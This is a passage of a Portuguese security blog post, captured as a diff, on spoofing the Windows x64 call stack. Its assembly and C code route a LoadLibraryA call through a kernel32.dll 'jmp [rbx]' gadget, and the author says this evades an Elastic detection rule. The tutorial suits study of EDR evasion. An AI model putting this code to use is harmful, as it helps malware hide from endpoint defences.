+<span class="line"><span style="color:#F97583">	jmp</span><span style="color:#F97583"> QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r10</span><span style="color:#E1E4E8">+Config.pTarget]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">cleanup:</span></span>
+<span class="line"><span style="color:#F97583">	add</span><span style="color:#79B8FF"> rsp</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">32</span><span style="color:#6A737D">	; Remove shadow space</span></span>
+<span class="line"><span style="color:#F97583">	jmp</span><span style="color:#79B8FF"> rdi</span><span style="color:#6A737D">			; Retorna ao endereço original salvo em RDI</span></span>
+<span class="line"><span style="color:#E1E4E8">Spoof ENDP</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">END</span></span></code></pre>
+<h2 id="registradores-principais-no-fluxo-de-execução">Registradores principais no fluxo de execução:<a aria-hidden="true" tabindex="-1" href="#registradores-principais-no-fluxo-de-execução"><span class="icon icon-link"></span></a></h2>
+<p><strong>RDI</strong> - Endereço de retorno original:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F97583">pop</span><span style="color:#79B8FF"> rdi</span><span style="color:#6A737D">  ; Salva o endereço de retorno da chamada de Spoof</span></span></code></pre>
+<p>• Vai conter: O endereço para onde Spoof deve retornar após terminar • Usado em: jmp rdi no cleanup (retorna ao chamador original)</p>
+<hr>
+<p><strong>R10</strong> - Ponteiro para a estrutura Config</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F97583">mov</span><span style="color:#79B8FF"> r10</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">rcx</span><span style="color:#6A737D">  ; Copia o 1º argumento (ponteiro para _STACK_CONFIG)</span></span></code></pre>
+<p>• Vai conter: Endereço base da estrutura _STACK_CONFIG • Usado para: Acessar todos os campos da struct (pArgs, pGadget, pTarget, pRbx)</p>
+<hr>
+<p><strong>R13</strong> - Ponteiro para o array de argumentos</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F97583">mov</span><span style="color:#79B8FF"> r13</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r10</span><span style="color:#E1E4E8"> + Config.pArgs]  </span><span style="color:#6A737D">; Carrega pArgs</span></span></code></pre>
+<p>• Vai conter: Endereço do array alocado com malloc(32) que tem os 4 argumentos • Usado para: Carregar arg1, arg2, arg3, arg4 nos registradores de chamada</p>
+<hr>
+<p><strong>RCX</strong>, <strong>RDX</strong>, <strong>R8</strong>, <strong>R9</strong> - Argumentos da função alvo</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F97583">mov</span><span style="color:#79B8FF"> rcx</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r13</span><span style="color:#E1E4E8">]        </span><span style="color:#6A737D">; arg1 → RCX</span></span>
+<span class="line"><span style="color:#F97583">mov</span><span style="color:#79B8FF"> rdx</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r13</span><span style="color:#E1E4E8"> + </span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">]    </span><span style="color:#6A737D">; arg2 → RDX</span></span>
+<span class="line"><span style="color:#F97583">mov</span><span style="color:#79B8FF"> r8</span><span style="color:#E1E4E8">,  </span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r13</span><span style="color:#E1E4E8"> + </span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">]   </span><span style="color:#6A737D">; arg3 → R8</span></span>
+<span class="line"><span style="color:#F97583">mov</span><span style="color:#79B8FF"> r9</span><span style="color:#E1E4E8">,  </span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r13</span><span style="color:#E1E4E8"> + </span><span style="color:#79B8FF">24</span><span style="color:#E1E4E8">]   </span><span style="color:#6A737D">; arg4 → R9</span></span></code></pre>
+<p>• Vão conter: Os 4 argumentos que serão passados para a função alvo</p>
+<hr>
+<p><strong>RAX</strong> - Endereço do gadget</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F97583">mov</span><span style="color:#79B8FF"> rax</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r10</span><span style="color:#E1E4E8"> + Config.pGadget]  </span><span style="color:#6A737D">; Carrega endereço do gadget</span></span>
+<span class="line"><span style="color:#F97583">push</span><span style="color:#79B8FF"> rax</span><span style="color:#6A737D"> ; Coloca na stack</span></span></code></pre>
+<hr>
+<p><strong>RBX</strong> - Ponteiro para pRbx (usado pelo gadget)</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F97583">lea</span><span style="color:#79B8FF"> rbx</span><span style="color:#E1E4E8">, cleanup                    </span><span style="color:#6A737D">; RBX = endereço de cleanup</span></span>
+<span class="line"><span style="color:#F97583">mov</span><span style="color:#F97583"> QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r10</span><span style="color:#E1E4E8"> + Config.pRbx], </span><span style="color:#79B8FF">rbx</span><span style="color:#6A737D">  ; Salva cleanup em pRbx</span></span>
+<span class="line"><span style="color:#F97583">lea</span><span style="color:#79B8FF"> rbx</span><span style="color:#E1E4E8">, [</span><span style="color:#79B8FF">r10</span><span style="color:#E1E4E8"> + Config.pRbx]       </span><span style="color:#6A737D">; RBX aponta para o campo pRbx</span></span></code></pre>
+<p>• Usado pelo gadget: jmp [rbx] lê [rbx] (que é cleanup) e pula para lá</p>
+<p><strong>INFO:</strong> Lembrando que o gadget na kernel32.dll consegue usar o valor de RBX porque registradores são globais, ou seja compartilhados por todo o código executando no mesmo thread, independente do módulo (DLL) onde está o código. Por isso, o jmp [rbx] no gadget acessa o mesmo RBX configurado.</p>
+<p><strong>RSP</strong> - Ponteiro da stack</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F97583">sub</span><span style="color:#79B8FF"> rsp</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">32</span><span style="color:#6A737D">  ; Reserva shadow space</span></span>
+<span class="line"><span style="color:#F97583">add</span><span style="color:#79B8FF"> rsp</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">32</span><span style="color:#6A737D">  ; Libera shadow space</span></span></code></pre>
+<p>• Vai ser manipulado: Para criar/destruir o shadow space obrigatório x64</p>
+<hr>
+<h2 id="fluxo-de-execução">Fluxo de Execução<a aria-hidden="true" tabindex="-1" href="#fluxo-de-execução"><span class="icon icon-link"></span></a></h2>
+<h3 id="pula-para-a-função-alvo">Pula para a função alvo:<a aria-hidden="true" tabindex="-1" href="#pula-para-a-função-alvo"><span class="icon icon-link"></span></a></h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F97583">jmp</span><span style="color:#F97583"> QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r10</span><span style="color:#E1E4E8"> + Config.pTarget]  </span><span style="color:#6A737D">; Pula para LoadLibraryA</span></span></code></pre>
+<p>Não usa call, usa jmp -> não empilha endereço de retorno A stack no topo contém: endereço do gadget (colocado com push rax) RCX/RDX/R8/R9 já têm os argumentos preparados Shadow space (32 bytes) já está reservado</p>
+<p>Função executa normalmente:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#E1E4E8">LoadLibraryA(</span><span style="color:#79B8FF">RCX</span><span style="color:#E1E4E8">="wininet.dll")</span></span></code></pre>
+<p>Processa os argumentos dos registradores Usa o shadow space na stack conforme convenção x64 Executa a lógica (carrega a DLL) RBX permanece intocado (registrador não-volátil preservado)</p>
+<h3 id="função-termina-com-ret">Função termina com ret<a aria-hidden="true" tabindex="-1" href="#função-termina-com-ret"><span class="icon icon-link"></span></a></h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F97583">ret</span><span style="color:#6A737D">  ; Instrução final de LoadLibraryA</span></span></code></pre>
+<p>Lê o topo da stack → encontra o endereço do gadget (não o endereço de Spoof!) Pula para o gadget localizado na <code>kernel32.dll</code> Se olhar a stack agora, parece que veio da <code>kernel32.dll</code>, não do nosso código!</p>
+<hr>
+<h2 id="spoofing-em-ação">Spoofing em ação<a aria-hidden="true" tabindex="-1" href="#spoofing-em-ação"><span class="icon icon-link"></span></a></h2>
+<p>Gadget executa dentro da <code>kernel32.dll</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#6A737D">; Gadget (0xFF 0x23) na kernel32.dll:</span></span>
+<span class="line"><span style="color:#F97583">jmp</span><span style="color:#F97583"> QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">rbx</span><span style="color:#E1E4E8">]</span></span></code></pre>
+<p>RBX aponta para Config.pRbx (endereço na nossa memória) [rbx] contém o endereço de cleanup Lê da memória o endereço de cleanup e pula para lá O gadget não usa a stack para obter o destino, só RBX</p>
+<h3 id="retorna-ao-código-spoof-cleanup">Retorna ao código Spoof (cleanup)<a aria-hidden="true" tabindex="-1" href="#retorna-ao-código-spoof-cleanup"><span class="icon icon-link"></span></a></h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#B392F0">cleanup:</span></span>
+<span class="line"><span style="color:#F97583">    add</span><span style="color:#79B8FF"> rsp</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">32</span><span style="color:#6A737D">  ; Remove shadow space</span></span>
+<span class="line"><span style="color:#F97583">    jmp</span><span style="color:#79B8FF"> rdi</span><span style="color:#6A737D">      ; Pula para o endereço original salvo</span></span></code></pre>
+<p>• Agora está de volta ao nosso código assembly • A stack está “limpa”</p>
+<h3 id="finalização">Finalização<a aria-hidden="true" tabindex="-1" href="#finalização"><span class="icon icon-link"></span></a></h3>
+<p>Libera shadow space</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F97583">add</span><span style="color:#79B8FF"> rsp</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">32</span></span></code></pre>
+<p>Remove os 32 bytes reservados no início Restaura RSP para o estado antes da chamada</p>
+<h3 id="retorna-ao-chamador-original">Retorna ao chamador original<a aria-hidden="true" tabindex="-1" href="#retorna-ao-chamador-original"><span class="icon icon-link"></span></a></h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F97583">jmp</span><span style="color:#79B8FF"> rdi</span><span style="color:#6A737D">  ; Volta para "main.cpp"</span></span></code></pre>
+<p>RDI contém o endereço salvo no início (pop rdi) Retorna para a linha após Spoof(&#x26;Config) no “main.cpp”</p>
+<hr>
+<h2 id="código-main">Código Main<a aria-hidden="true" tabindex="-1" href="#código-main"><span class="icon icon-link"></span></a></h2>
+<p>Para conseguir spoofar a função que queremos, o nosso código <code>main</code> vai ficar assim:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">int</span><span style="color:#B392F0"> main</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#E1E4E8">	STACK_CONFIG Config;</span></span>
+<span class="line"><span style="color:#E1E4E8">	UINT64 pLoadLibraryA;</span></span>
+<span class="line"><span style="color:#E1E4E8">	HMODULE hWininet;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">	PBYTE pKernel32 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PBYTE)</span><span style="color:#B392F0">GetModuleHandleA</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"kernel32"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">	PBYTE pGadget </span><span style="color:#F97583">=</span><span style="color:#B392F0"> FindGadget</span><span style="color:#E1E4E8">(pKernel32);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">	pLoadLibraryA </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (UINT64)</span><span style="color:#B392F0">GetProcAddress</span><span style="color:#E1E4E8">((HMODULE)pKernel32, </span><span style="color:#9ECBFF">"LoadLibraryA"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">	const</span><span style="color:#F97583"> char*</span><span style="color:#E1E4E8"> dllName </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "wininet.dll"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">	if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">SetupConfig</span><span style="color:#E1E4E8">((PVOID)pGadget, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">Config, (PVOID)pLoadLibraryA, (UINT64)dllName, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">))</span></span>
+<span class="line"><span style="color:#F97583">		return</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">	hWininet </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (HMODULE)</span><span style="color:#B392F0">Spoof</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">Config);</span></span>
+<span class="line"><span style="color:#B392F0">	printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] wininet.dll carregada em: 0x</span><span style="color:#79B8FF">%llx\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, (UINT64)hWininet);</span></span>
+<span class="line"><span style="color:#B392F0">	getchar</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">	return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>No nosso código <code>main</code> não tem muita novidade. Basicamente, a única coisa que vamos fazer é passar os argumentos para <code>SetupConfig</code> e depois chamar o nosso método <code>Spoof</code>.</p>
+<p>Lembrando que você vai ter que declarar:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">extern</span><span style="color:#9ECBFF"> "C"</span><span style="color:#E1E4E8"> PVOID </span><span style="color:#B392F0">Spoof</span><span style="color:#E1E4E8">(PSTACK_CONFIG </span><span style="color:#FFAB70">pConfig</span><span style="color:#E1E4E8">);</span></span></code></pre>
+<p>Declaramos extern “C” para desativar o name mangling do C++ e permitir que o linker encontre a função Spoof implementada em Assembly pelo nome exato, onde Spoof recebe um ponteiro para a estrutura <code>_STACK_CONFIG</code> (PSTACK_CONFIG pConfig), permitindo que o Assembly acesse todos os campos da struct usando offsets a partir desse endereço base.</p>
+<hr>
+<h2 id="resultado">Resultado<a aria-hidden="true" tabindex="-1" href="#resultado"><span class="icon icon-link"></span></a></h2>
+<p>Para testar nosso código final, eu vou estar transformando esse código para shellcode e estarei executando:</p>
+<p>![[Pasted image 20260422180418.png]]</p>
+<p><strong>WARNING:</strong> Repare que a <code>wininet.dll</code> aparece carregada duas vezes. Isso acontece por causa do conversor que eu usei, que acabava carregando a DLL antes do nosso código. Então eu precisei desmapear ela para conseguir capturar a stack correta.</p>
+<p>Por fim, com esse resultado, já conseguimos contornar a rule do Elastic, pois a stack mostra que quem chamou a função <code>LoadLibraryA</code> foi a <code>kernel32.dll</code>, que está mapeada na memória do processo. Mas, claro, ao analisar a stack completa, ainda é possível perceber que quem “chamou” a <code>kernel32</code> foi o nosso próprio código, que não está mapeado, como dá para ver na imagem.</p>
+<p>![[Pasted image 20260422180434.png]]</p>  </article> <div class="post__footer" data-astro-cid-jj6gr7j4> <div class="footer-grid" data-astro-cid-jj6gr7j4> <div class="footer-col" data-astro-cid-jj6gr7j4> <span class="footer-label" data-astro-cid-jj6gr7j4>Published</span> <span class="footer-value" data-astro-cid-jj6gr7j4> December 22, 2025 </span> <span class="footer-subtext" data-astro-cid-jj6gr7j4>13 min read • 2509 words</span> </div> <div class="footer-col" data-astro-cid-jj6gr7j4> <span class="footer-label" data-astro-cid-jj6gr7j4>Written By</span> <div class="footer-author" data-astro-cid-jj6gr7j4> <img class="footer-avatar" src="https://avatars.githubusercontent.com/u/124220594?v=4" alt="Vithor avatar" data-astro-cid-jj6gr7j4> <span class="footer-value" data-astro-cid-jj6gr7j4>Vithor</span> </div> </div> </div> </div> </article> </div> <script type="module" src="/assets/hoisted.js"></script> <script>(function(){const webAssetMap = {"drawing 2026-02-20 00.00.48.excalidraw 1.dkem-zja.png":"/_astro/Drawing 2026-02-20 00.00.48.excalidraw 1.DkeM-zja.png","drawing 2026-02-20 00.00.48.excalidraw 1.png":"/_astro/Drawing 2026-02-20 00.00.48.excalidraw 1.DkeM-zja.png","hytale-site.png":"/_astro/Hytale-site.WArzXDzQ.png","opocl8j.png":"/_astro/OPocl8J.DB4sm_Ju.png","pasted image 20260422174950.png":"/_astro/Pasted image 20260422174950.De5DijAk.png","pasted image 20260422174957.png":"/_astro/Pasted image 20260422174957.CLKWtQ_B.png","pasted image 20260422175306.png":"/_astro/Pasted image 20260422175306.DSgsY8-P.png","pasted image 20260422175329.png":"/_astro/Pasted image 20260422175329.B7LXNXbd.png","pasted image 20260422175412.png":"/_astro/Pasted image 20260422175412.BAng7CLU.png","pasted image 20260422175637.png":"/_astro/Pasted image 20260422175637.BW7lRa-0.png","pasted image 20260422175910.png":"/_astro/Pasted image 20260422175910.Bhdak3EL.png","pasted image 20260422175926.png":"/_astro/Pasted image 20260422175926.BDjP3UPN.png","pasted image 20260422180418.png":"/_astro/Pasted image 20260422180418.CHOMSox5.png","pasted image 20260422180434.png":"/_astro/Pasted image 20260422180434.DPCCixIR.png","anyrun-score.png":"/_astro/anyrun-score.DZZodPNl.png","c2-plugin-confirmation.png":"/_astro/c2-plugin-confirmation.D-Mg2rFb.png","c2-registration-beacon.png":"/_astro/c2-registration-beacon.aktermma.png","c2-tcp-connections.png":"/_astro/c2-tcp-connections.BjQ9zo7k.png","callback2_0_diagram.png":"/_astro/callback2_0_diagram.rlCLpWWO.png","classformat-error-duplicate.png":"/_astro/classformat-error-duplicate.BY8lZQFg.png","dll-injection-loop.png":"/_astro/dll-injection-loop.BFrvO5Ph.png","dllmain-to-beginthread.png":"/_astro/dllmain-to-beginthread.BabeDkB4.png","dllmain-to-createthread.png":"/_astro/dllmain-to-createthread.CfUkcik1.png","dmca-takedown-notice.png":"/_astro/dmca-takedown-notice.CHnmuelm.png","dynamic-api-resolution.png":"/_astro/dynamic-api-resolution.iyES2fPg.png","f2p-launcher-play-button.png":"/_astro/f2p-launcher-play-button.BZofspnP.png","gdip-dispose-breakpoint.png":"/_astro/gdip-dispose-breakpoint.BPyAOFhP.png","gdip-dispose-call-stack.png":"/_astro/gdip-dispose-call-stack.Cd1GIJSZ.png","gdiplus-steganography.png":"/_astro/gdiplus-steganography.BBZjfh_n.png","hytale-diagram-banner-3x.png":"/_astro/hytale-diagram-banner-3x.D9s6PuOs.png","hytale-game-running.png":"/_astro/hytale-game-running.D6qGXJpz.png","image-6.png":"/_astro/image-6.Cgr6oDif.png","image_paranoid.png":"/_astro/image_paranoid.BdhBf3mF.png","import-table-comparison.png":"/_astro/import-table-comparison.C2lEWbdu.png","inno-setup-stage2.png":"/_astro/inno-setup-stage2.DaUcjtEX.png","installer-comparison.png":"/_astro/installer-comparison.gzLwVWL7.png","integrity-verification-error.png":"/_astro/integrity-verification-error.P_3cswWq.png","invalid-digital-signature.png":"/_astro/invalid-digital-signature.rHxp6eSK.png","java-bytecode-dump.png":"/_astro/java-bytecode-dump.y3qZQxQT.png","jnativehook-globalscreen.png":"/_astro/jnativehook-globalscreen.CMqCTa4v.png","loadlibrary-call-stack.png":"/_astro/loadlibrary-call-stack.DZUZYJxc.png","luah54-string-references.png":"/_astro/luah54-string-references.BuRPMLzM.png","luah54-virustotal.png":"/_astro/luah54-virustotal.D1WZOXnk.png","malicious-file-artifacts.png":"/_astro/malicious-file-artifacts.BOLmsyMo.png","payload-execution-success.png":"/_astro/payload-execution-success.BGtaZ2Co.png","payload-register-state.png":"/_astro/payload-register-state.CdzXLJ6g.png","pic-shellcode-text-section.png":"/_astro/pic-shellcode-text-section.DaBjwcra.png","procmon-dll-loading.png":"/_astro/procmon-dll-loading.Cu8xfata.png","skidfuscator-ascii-art.png":"/_astro/skidfuscator-ascii-art.Cq9FiBTA.png","skidfuscator-obfuscated-class.png":"/_astro/skidfuscator-obfuscated-class.DbamIPKP.png","sluvimd.png":"/_astro/sluvimD.BLBHNB38.png","sqlite3-virustotal.png":"/_astro/sqlite3-virustotal.QiXrQqf2.png","stager-path-resolution.png":"/_astro/stager-path-resolution.CCe8M2pQ.png","steganography-carrier.png":"/_astro/steganography-carrier.CRwdqBav.png","trailing-null-bytes-removal.png":"/_astro/trailing-null-bytes-removal.ChhUIQwk.png","windbg-loaded-libraries.png":"/_astro/windbg-loaded-libraries.DZW-iomw.png"};
+
+      const WEB_ASSET_MAP = webAssetMap || {};
+
+      const resolveWebAsset = (rawName) => {
+        const key = (rawName || "").trim().toLowerCase();
+        if (!key) return "";
+        if (key.startsWith("http://") || key.startsWith("https://") || key.startsWith("/")) return rawName.trim();
+        return WEB_ASSET_MAP[key] || WEB_ASSET_MAP[key.replace(/^web\//, "")] || "";
+      };
+
+      const enhanceObsidianEmbeds = (root) => {
+        const nodes = Array.from(root.querySelectorAll("p"));
+        nodes.forEach((p) => {
+          if (p.closest(".inline-asset-row")) return;
+          const text = (p.textContent || "").trim();
+          const match = text.match(/^!\[\[(.+?)\]\]$/);
+          if (!match) return;
+
+          const payload = match[1];
+          const parts = payload.split("|");
+          const file = (parts[0] || "").trim();
+          const caption = (parts.slice(1).join("|") || "").trim();
+          const src = resolveWebAsset(file);
+          if (!src) return;
+
+          const figure = document.createElement("figure");
+          figure.className = "obsidian-embed";
+          const img = document.createElement("img");
+          img.src = src;
+          img.alt = caption || file;
+          img.loading = "lazy";
+          figure.appendChild(img);
+
+          if (caption) {
+            const cap = document.createElement("figcaption");
+            cap.textContent = caption;
+            figure.appendChild(cap);
+          }
+
+          p.replaceWith(figure);
+        });
+      };
+
+      const ensureImageModal = () => {
+        let overlay = document.getElementById("image-modal-overlay");
+        if (overlay) return overlay;
+
+        overlay = document.createElement("div");
+        overlay.id = "image-modal-overlay";
+        overlay.className = "image-modal-overlay";
+        overlay.innerHTML = '<div class="image-modal-card"><img class="image-modal-image" alt="Expanded media" /></div>';
+        document.body.appendChild(overlay);
+
+        overlay.addEventListener("click", (event) => {
+          if (event.target === overlay) overlay.classList.remove("open");
+        });
+
+        return overlay;
+      };
+
+      window.openImageModal = (src, alt = "image") => {
+        const overlay = ensureImageModal();
+        const img = overlay.querySelector("img");
+        if (!img) return;
+        img.src = src;
+        img.alt = alt;
+        overlay.classList.add("open");
+      };
+
+      window.copyCode = async (button) => {
+        const row = button.closest(".inline-asset-row");
+        const code = row?.querySelector("pre code")?.textContent ?? "";
+        if (!code) return;
+        try {
+          await navigator.clipboard.writeText(code);
+          const previous = button.textContent;
+          button.textContent = "[ COPIED ]";
+          setTimeout(() => {
+            button.textContent = previous;
+          }, 1200);
+        } catch {
+          button.textContent = "[ FAILED ]";
+        }
+      };
+
+      const getImageFormat = (src) => {
+        const clean = src.split("?")[0].split("#")[0].toLowerCase();
+        const ext = clean.split(".").pop();
+        if (!ext || ext === clean) return "IMG";
+        if (ext === "jpeg") return "JPG";
+        return ext.toUpperCase();
+      };
+
+      const getYouTubeVideoId = (rawUrl) => {
+        try {
+          const url = new URL(rawUrl);
+          const host = url.hostname.replace(/^www\./, "").toLowerCase();
+          if (host === "youtu.be") {
+            return url.pathname.replace(/^\//, "").split("/")[0] || "";
+          }
+          if (host === "youtube.com" || host === "m.youtube.com" || host === "youtube-nocookie.com") {
+            if (url.pathname === "/watch") {
+              return url.searchParams.get("v") || "";
+            }
+            if (url.pathname.startsWith("/embed/")) {
+              return url.pathname.split("/embed/")[1]?.split("/")[0] || "";
+            }
+            if (url.pathname.startsWith("/shorts/")) {
+              return url.pathname.split("/shorts/")[1]?.split("/")[0] || "";
+            }
+          }
+        } catch {
+          return "";
+        }
+        return "";
+      };
+
+      const enhanceMarkdownCallouts = (root) => {
+        const validTypes = ["WARNING", "INFO", "BUG", "NOTE", "TIP"];
+        const iconByType = {
+          WARNING: "⚠",
+          INFO: "ℹ",
+          BUG: "🐞",
+          NOTE: "✎",
+          TIP: "✓",
+        };
+
+        const paragraphs = Array.from(root.querySelectorAll("p"));
+        paragraphs.forEach((p) => {
+          if (p.closest(".md-callout")) return;
+          const first = p.querySelector(":scope > strong");
+          if (!first) return;
+
+          const rawLabel = (first.textContent || "").trim();
+          const upper = rawLabel.toUpperCase();
+          const type = validTypes.find((t) => upper.includes(t));
+          if (!type) return;
+
+          const clone = p.cloneNode(true);
+          const strong = clone.querySelector("strong");
+          if (!strong) return;
+          strong.remove();
+
+          if (clone.firstChild && clone.firstChild.nodeType === Node.TEXT_NODE) {
+            clone.firstChild.textContent = clone.firstChild.textContent.replace(/^[\s\u00a0:：\-]+/, "");
+          }
+
+          const contentHtml = clone.innerHTML.trim();
+          if (!contentHtml) return;
+
+          const box = document.createElement("div");
+          box.className = `md-callout md-callout--${type.toLowerCase()}`;
+          box.innerHTML = `
+            <div class="md-callout__icon" aria-hidden="true">${iconByType[type] || "•"}</div>
+            <div class="md-callout__content"><p>${contentHtml}</p></div>
+          `;
+
+          p.replaceWith(box);
+        });
+      };
+
+      const enhanceMarkdownTables = (root) => {
+        const tables = Array.from(root.querySelectorAll("table"));
+        tables.forEach((table) => {
+          if (table.closest(".table-scroll")) return;
+          const wrapper = document.createElement("div");
+          wrapper.className = "table-scroll";
+          table.parentNode?.insertBefore(wrapper, table);
+          wrapper.appendChild(table);
+        });
+      };
+
+      const wrapWithSidecar = (target, desktopSidecar, mobileBar, rowClass, areaClass) => {
+        if (!target || target.closest(".inline-asset-row")) return null;
+        const row = document.createElement("div");
+        row.className = `inline-asset-row ${rowClass} group`;
+        const content = document.createElement("div");
+        content.className = `asset-content asset-area ${areaClass}`;
+        target.parentNode?.insertBefore(row, target);
+        row.appendChild(desktopSidecar);
+        row.appendChild(mobileBar);
+        row.appendChild(content);
+        content.appendChild(target);
+        return row;
+      };
+
+      const enhanceProseBlocks = (root) => {
+        const images = Array.from(root.querySelectorAll("img"));
+        images.forEach((img) => {
+          if (!img.src || img.closest(".inline-asset-row")) return;
+          const youtubeId = getYouTubeVideoId(img.src);
+          if (youtubeId) {
+            const captionText = (img.alt || "").trim();
+            const showCaption = captionText && captionText.toLowerCase() !== "video";
+
+            const figure = document.createElement("figure");
+            figure.className = "video-embed";
+
+            const frame = document.createElement("div");
+            frame.className = "video-embed__frame";
+            frame.innerHTML = `<iframe src="https://www.youtube.com/embed/${youtubeId}?rel=0" title="YouTube video player" loading="lazy" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>`;
+            figure.appendChild(frame);
+
+            if (showCaption) {
+              const caption = document.createElement("figcaption");
+              caption.textContent = captionText;
+              figure.appendChild(caption);
+            }
+
+            const parent = img.parentElement;
+            if (parent && parent.tagName === "P" && parent.childElementCount === 1 && (parent.textContent || "").trim() === "") {
+              parent.replaceWith(figure);
+            } else {
+              img.replaceWith(figure);
+            }
+            return;
+          }
+
+          const host = img;
+
+          const sidecar = document.createElement("div");
+          sidecar.className = "desktop-sidecar desktop-sidecar--image";
+          sidecar.innerHTML = `
+            <div class="asset-sidecar__label">${getImageFormat(img.src)}</div>
+            <button type="button" class="asset-sidecar__button" title="Open image">[ VIEW ]</button>
+          `;
+          sidecar.querySelector("button")?.addEventListener("click", () => {
+            window.openImageModal(img.src, img.alt || "image");
+          });
+
+          if (!img.dataset.zoomBound) {
+            img.dataset.zoomBound = "true";
+            img.style.cursor = "zoom-in";
+            img.addEventListener("click", (event) => {
+              event.preventDefault();
+              window.openImageModal(img.src, img.alt || "image");
+            });
+          }
+
+          const mobileBar = document.createElement("div");
